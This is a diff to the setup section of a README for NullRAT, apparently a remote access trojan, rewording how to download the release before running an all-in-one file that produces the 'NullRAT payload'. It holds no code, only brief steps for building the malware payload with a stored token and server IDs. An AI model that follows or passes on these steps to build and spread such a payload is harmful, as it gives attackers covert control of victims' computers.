@@ -96,7 +96,7 @@
 - Store the [Notification ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#channel-id) and [Server ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#server-ids) along with the token for ease of access
 
 #### Steps:
-1. Dowload the latest release of NullRAT (recommended) [**git clone** and **download zip** is supported, but will be unstable]
+1. Dowload the latest release of NullRAT (recommended) [**git clone**/**download zip** for dev builds]
 2. Run the AIO File and follow the prompts. NullRAT payload will be right there!
 
 - **Video tutorial:** Soon
